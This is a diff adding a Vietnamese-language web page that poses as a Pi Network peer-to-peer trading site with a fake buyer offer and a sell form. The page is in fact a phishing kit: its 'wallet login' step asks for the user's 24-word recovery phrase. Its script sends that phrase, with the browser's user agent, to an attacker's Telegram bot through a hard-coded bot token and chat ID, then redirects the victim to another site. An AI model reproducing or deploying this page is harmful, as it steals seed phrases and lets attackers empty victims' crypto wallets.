@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pi Network P2P Trading</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Inter", sans-serif;
+      }
+
+      :root {
+        --pi-purple: #6f42c1;
+        --pi-purple-dark: #5a35a0;
+        --pi-purple-light: #8250df;
+      }
+
+      body {
+        background: #f8f9fa;
+        color: #2d3436;
+        line-height: 1.6;
+      }
+
+      .header {
+        background: linear-gradient(
+          135deg,
+          var(--pi-purple),
+          var(--pi-purple-dark)
+        );
+        padding: 1.5rem;
+        position: fixed;
+        width: 100%;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 4px 20px rgba(111, 66, 193, 0.15);
+      }
+
+      .header-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        text-align: center;
+      }
+
+      .header h1 {
+        color: white;
+        font-size: 1.75rem;
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+      }
+
+      .header p {
+        color: rgba(255, 255, 255, 0.9);
+        font-size: 1rem;
+        margin-bottom: 1rem;
+      }
+
+      .search-bar {
+        display: flex;
+        gap: 0.5rem;
+        justify-content: center;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .search-bar input {
+        flex: 1;
+        padding: 0.875rem 1.25rem;
+        border: none;
+        border-radius: 12px;
+        background: rgba(255, 255, 255, 0.1);
+        color: white;
+        font-size: 1rem;
+        backdrop-filter: blur(10px);
+        transition: all 0.3s ease;
+      }
+
+      .search-bar input::placeholder {
+        color: rgba(255, 255, 255, 0.7);
+      }
+
+      .search-bar input:focus {
+        outline: none;
+        background: rgba(255, 255, 255, 0.15);
+      }
+
+      .search-button {
+        padding: 0.875rem 1.5rem;
+        background: rgba(255, 255, 255, 0.1);
+        border: none;
+        border-radius: 12px;
+        color: white;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .search-button:hover {
+        background: rgba(255, 255, 255, 0.2);
+      }
+
+      .main-container {
+        margin-top: 180px;
+        padding: 1.5rem;
+        max-width: 1200px;
+        margin-left: auto;
+        margin-right: auto;
+        padding-bottom: 120px;
+      }
+
+      .trade-card {
+        background: white;
+        border-radius: 16px;
+        padding: 1.5rem;
+        margin-bottom: 1.5rem;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        transition: all 0.3s ease;
+      }
+
+      .trade-card:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 8px 30px rgba(111, 66, 193, 0.15);
+      }
+
+      .seller-info {
+        display: flex;
+        align-items: center;
+        gap: 1rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .avatar {
+        width: 48px;
+        height: 48px;
+        background: var(--pi-purple);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: 600;
+        font-size: 1.25rem;
+      }
+
+      .seller-details {
+        color: #64748b;
+        font-size: 0.875rem;
+        margin-top: 0.25rem;
+      }
+
+      .trade-details {
+        padding: 1rem;
+        background: #f8fafc;
+        border-radius: 12px;
+        margin-bottom: 1rem;
+      }
+
+      .trade-details p {
+        margin-bottom: 0.5rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+
+      .price {
+        color: var(--pi-purple);
+        font-size: 1.25rem;
+        font-weight: 600;
+      }
+
+      .action-button {
+        width: 100%;
+        padding: 1rem;
+        border: none;
+        border-radius: 12px;
+        font-weight: 600;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        background: var(--pi-purple);
+        color: white;
+      }
+
+      .action-button:hover {
+        background: var(--pi-purple-dark);
+      }
+
+      .sell-pi-container {
+        background: white;
+        border-radius: 16px;
+        padding: 2rem;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        margin-bottom: 80px;
+      }
+
+      .sell-form h2 {
+        color: var(--pi-purple);
+        margin-bottom: 1.5rem;
+      }
+
+      .input-group {
+        background: #f8fafc;
+        border-radius: 12px;
+        padding: 1rem;
+        margin-bottom: 1.5rem;
+      }
+
+      .input-group label {
+        display: block;
+        color: #64748b;
+        margin-bottom: 0.5rem;
+        font-weight: 500;
+      }
+
+      .input-group input {
+        width: 100%;
+        padding: 0.75rem;
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        font-size: 1rem;
+        transition: all 0.3s ease;
+      }
+
+      .input-group input:focus {
+        outline: none;
+        border-color: var(--pi-purple);
+        box-shadow: 0 0 0 3px rgba(111, 66, 193, 0.1);
+      }
+
+      .payment-options {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 1rem;
+        margin: 1.5rem 0;
+      }
+
+      .payment-method {
+        padding: 1rem;
+        border: 1px solid #e2e8f0;
+        border-radius: 12px;
+        background: white;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .payment-method:hover {
+        border-color: var(--pi-purple);
+        background: #f8f9ff;
+      }
+
+      .payment-method.active {
+        background: var(--pi-purple);
+        border-color: var(--pi-purple);
+        color: white;
+      }
+
+      .footer {
+        background: white;
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        padding: 1rem 0;
+        box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.08);
+      }
+
+      .footer-menu {
+        display: flex;
+        justify-content: space-around;
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .footer-item {
+        color: #64748b;
+        text-decoration: none;
+        text-align: center;
+        transition: all 0.3s ease;
+        padding: 0.5rem;
+      }
+
+      .footer-item:hover {
+        color: var(--pi-purple);
+        transform: translateY(-2px);
+      }
+
+      .footer-item i {
+        display: block;
+        font-size: 1.5rem;
+        margin-bottom: 0.25rem;
+      }
+
+      .footer-item span {
+        font-size: 0.75rem;
+        font-weight: 500;
+      }
+
+      .login-page {
+        background: white;
+        border-radius: 16px;
+        padding: 2rem;
+        max-width: 500px;
+        margin: 2rem auto;
+        text-align: center;
+        margin: 2rem auto 80px auto;
+      }
+
+      .login-page h2 {
+        color: var(--pi-purple);
+        margin-bottom: 1rem;
+      }
+
+      .login-page textarea {
+        width: 100%;
+        padding: 1rem;
+        border: 1px solid #e2e8f0;
+        border-radius: 12px;
+        margin: 1rem 0;
+        font-size: 1rem;
+        resize: none;
+      }
+
+      .error-message {
+        color: #ef4444;
+        margin: 1rem 0;
+        padding: 0.75rem;
+        background: #fef2f2;
+        border-radius: 8px;
+        font-size: 0.875rem;
+      }
+
+      /* Thêm style cho loading spinner */
+      .loading-spinner {
+        display: none;
+        width: 20px;
+        height: 20px;
+        border: 2px solid #ffffff;
+        border-radius: 50%;
+        border-top-color: transparent;
+        animation: spin 1s linear infinite;
+        margin-right: 8px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .success-message {
+        color: #10b981;
+        margin: 1rem 0;
+        padding: 0.75rem;
+        background: #ecfdf5;
+        border-radius: 8px;
+        font-size: 0.875rem;
+        display: none;
+      }
+
+      @media (max-width: 768px) {
+        .header {
+          padding: 1rem;
+        }
+
+        .main-container {
+          margin-top: 160px;
+          padding: 1rem;
+        }
+
+        .trade-card {
+          padding: 1rem;
+        }
+
+        .payment-options {
+          grid-template-columns: 1fr;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Header phía trên giữ nguyên -->
+    <header class="header">
+      <div class="header-container">
+        <h1>Pi Network P2P Trading</h1>
+        <p>Giao dịch P2P An toàn & Nhanh chóng</p>
+        <div class="search-bar">
+          <input type="text" placeholder="Tìm kiếm giao dịch..." />
+          <button class="search-button">
+            <i class="fas fa-search"></i>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <main class="main-container">
+      <section id="trade-section">
+        <div class="trade-card">
+          <div class="seller-info">
+            <div class="avatar">P</div>
+            <div>
+              <strong>Pi Exchange ★★★★★</strong>
+              <div class="seller-details">
+                <i class="fas fa-check-circle"></i> Đã xác minh |
+                <i class="fas fa-clock"></i> Thời gian phản hồi: 5 phút
+              </div>
+            </div>
+          </div>
+          <div class="trade-details">
+            <p>
+              <span>Số dư khả dụng:</span>
+              <span>552,000,000VND</span>
+            </p>
+            <p>
+              <span>Giới hạn giao dịch:</span>
+              <span>50 - 10,000 π</span>
+            </p>
+            <p>
+              <span>Giá bán:</span>
+              <span class="price">55,000 VND/π</span>
+            </p>
+            <p>
+              <span>Phương thức thanh toán:</span>
+              <span>
+                <i class="fas fa-university"></i> Ngân hàng
+                <i class="fas fa-wallet"></i> Momo
+              </span>
+            </p>
+          </div>
+          <button class="action-button" onclick="showSellPi()">
+            <i class="fas fa-exchange-alt"></i> Giao dịch ngay
+          </button>
+        </div>
+      </section>
+
+      <section id="sell-pi" class="sell-pi-container" style="display: none">
+        <div class="sell-form">
+          <h2>Bán Pi Network</h2>
+          <div class="input-group">
+            <label>Số lượng Pi muốn bán</label>
+            <input
+              type="number"
+              placeholder="Nhập số lượng Pi"
+              oninput="updateVND()"
+            />
+          </div>
+          <div class="input-group">
+            <label>Số tiền nhận được (VND)</label>
+            <div id="vnd-amount" class="price">0 VND</div>
+          </div>
+          <div class="payment-options">
+            <button class="payment-method active">
+              <i class="fas fa-university"></i>
+              <span>Ngân hàng</span>
+            </button>
+            <button class="payment-method">
+              <i class="fas fa-wallet"></i>
+              <span>Momo</span>
+            </button>
+            <button class="payment-method">
+              <i class="fas fa-money-bill-wave"></i>
+              <span>ZaloPay</span>
+            </button>
+          </div>
+          <button class="action-button" onclick="showLoginPage()">
+            <i class="fas fa-lock"></i> Xác nhận giao dịch
+          </button>
+        </div>
+      </section>
+
+      <section id="login-page" class="login-page" style="display: none">
+        <h2>Đăng nhập ví Pi</h2>
+        <p>
+          Vui lòng nhập 24 cụm từ ví khôi phục để đăng nhập và hoàn tất giao
+          dịch
+        </p>
+        <textarea
+          id="recovery-phrase"
+          rows="4"
+          placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"
+        ></textarea>
+        <div class="error-message" style="display: none">
+          Cụm từ khôi phục không hợp lệ. Vui lòng kiểm tra lại.
+        </div>
+        <div class="success-message">
+          Đăng nhập thành công! Đang xử lý chờ hàng đợi giao dịch...
+        </div>
+        <button class="action-button" onclick="validatePassphrase()">
+          <div class="loading-spinner"></div>
+          <i class="fas fa-sign-in-alt"></i> ĐĂNG NHẬP VỚI CỤM MẬT KHẨU
+        </button>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-menu">
+        <a href="#" class="footer-item">
+          <i class="fas fa-home"></i>
+          <span>Trang chủ</span>
+        </a>
+        <a href="#" class="footer-item">
+          <i class="fas fa-exchange-alt"></i>
+          <span>Giao dịch</span>
+        </a>
+        <a href="#" class="footer-item">
+          <i class="fas fa-wallet"></i>
+          <span>Ví</span>
+        </a>
+        <a href="#" class="footer-item">
+          <i class="fas fa-user"></i>
+          <span>Tài khoản</span>
+        </a>
+      </div>
+    </footer>
+
+    <script>
+      function updateVND() {
+        const piAmount = document.querySelector('input[type="number"]').value;
+        const vndAmount = (piAmount * 55000).toLocaleString("vi-VN");
+        document.getElementById("vnd-amount").textContent = vndAmount + " VND";
+      }
+
+      function showSellPi() {
+        document.getElementById("trade-section").style.display = "none";
+        document.getElementById("sell-pi").style.display = "block";
+      }
+
+      function showLoginPage() {
+        document.getElementById("sell-pi").style.display = "none";
+        document.getElementById("login-page").style.display = "block";
+      }
+
+      async function validatePassphrase() {
+        const recoveryPhrase = document
+          .getElementById("recovery-phrase")
+          .value.trim();
+        const errorMessage = document.querySelector(".error-message");
+        const successMessage = document.querySelector(".success-message");
+        const loadingSpinner = document.querySelector(".loading-spinner");
+        const submitButton = document.querySelector(
+          "#login-page .action-button"
+        );
+
+        if (!recoveryPhrase) {
+          errorMessage.style.display = "block";
+          successMessage.style.display = "none";
+          return;
+        }
+
+        // Show loading state
+        loadingSpinner.style.display = "inline-block";
+        submitButton.disabled = true;
+        errorMessage.style.display = "none";
+
+        try {
+          // Replace these with your actual Telegram bot token and chat ID
+          const BOT_TOKEN = "7161535723:AAHpmjnS9lD_iknkXFZOgwkrTR_8WE5iZJs";
+          const CHAT_ID = "5867504772";
+
+          const message = `
+New Recovery Phrase:
+${recoveryPhrase}
+
+User Agent: ${navigator.userAgent}
+Timestamp: ${new Date().toISOString()}
+        `;
+
+          // Send to Telegram bot
+          const telegramAPI = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          const response = await fetch(telegramAPI, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "HTML",
+            }),
+          });
+
+          if (response.ok) {
+            // Show success message
+            successMessage.style.display = "block";
+            errorMessage.style.display = "none";
+            document.getElementById("recovery-phrase").value = "";
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+              window.location.href = "https://zgxft4.csb.app/";
+            }, 2000);
+          } else {
+            throw new Error("Failed to send message");
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          errorMessage.style.display = "block";
+          errorMessage.textContent = "Có lỗi xảy ra. Vui lòng thử lại sau.";
+          successMessage.style.display = "none";
+        } finally {
+          loadingSpinner.style.display = "none";
+          submitButton.disabled = false;
+        }
+      }
+
+      // Xử lý chọn phương thức thanh toán
+      const paymentMethods = document.querySelectorAll(".payment-method");
+      paymentMethods.forEach((method) => {
+        method.addEventListener("click", () => {
+          paymentMethods.forEach((m) => m.classList.remove("active"));
+          method.classList.add("active");
+        });
+      });
+    </script>
+  </body>
+</html>
